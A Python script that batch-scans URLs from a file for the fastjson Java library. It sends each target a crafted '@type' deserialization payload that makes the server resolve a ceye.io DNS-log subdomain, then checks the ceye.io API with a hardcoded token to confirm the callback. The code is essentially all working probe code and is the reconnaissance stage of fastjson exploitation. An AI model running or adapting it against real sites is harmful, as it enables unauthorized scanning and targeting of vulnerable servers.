import requests
import re
import time
import threading

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

def fastjson_check(url):
    data = '{"zeo":{"@type":"java.net.Inet4Address","val":"'+url+'.hsl35u.ceye.io"}}'
    try:
        sends = requests.post(url=url,headers=headers,data=data,timeout=20)
    except:
        print (url+'访问失败，请重试或检查网络')
    
    time.sleep(3)
    try:
        check_dnslog = requests.get(url="http://api.ceye.io/v1/records?token=5f1666e8b343f4c27662584d31714356&type=dns&filter=",headers=headers)
    except:
        print ('dnslogAPI调用失败，重新执行')
    if check_dnslog.text.find(url) >= 0:
        print ('[+]'+url+' is fastjson')
        with open('result.txt','a+') as f:
            f.write('[+]'+url+' is fastjson\n')
        
        #print (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
    else:
        print ('[-]'+url+' not is fastjson')
        with open('result.txt','a+') as f:
            f.write('[-]'+url+' not is fastjson\n')
        
if __name__ == "__main__":
    hosts_list = []
    with open('result.txt','a+') as f:
            f.write('------------------'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'------------------\n')
    #semaphore = threading.BoundedSemaphore(5)
    print ('dnslog接收可能会有延迟，为了提高准确性,检测一个需要等待30s左右。')
    print ('------------------------------------开始检测------------------------------------')
    for target in open('target.txt'):
        #print (target.strip())
        fastjson_check(target.strip())
    
